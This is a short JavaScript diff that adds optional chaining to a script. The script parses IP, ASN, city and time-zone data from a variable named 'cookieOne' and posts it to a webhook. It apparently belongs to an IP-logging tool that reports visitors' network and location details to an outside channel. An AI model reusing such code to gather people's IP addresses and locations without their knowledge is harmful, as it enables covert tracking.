@@ -13,10 +13,10 @@ const hook = new Webhook(webHookUrl);
 const jsonData = JSON.parse(cookieOne);
 
 const embed = new MessageBuilder()
-.setTitle(jsonData.ip + " - " + jsonData.asn.name)
+.setTitle(jsonData?.ip + " - " + jsonData?.asn?.name)
 .setColor('#00b0f4')
 .setDescription('```json\n' + JSON.stringify(jsonData, null, 2) + '```')
-.setFooter(jsonData.city + " | " + jsonData.time_zone.abbr, jsonData.flag)
+.setFooter(jsonData?.city + " | " + jsonData?.time_zone?.abbr, jsonData?.flag)
 .setTimestamp();
  
 hook.send(embed);
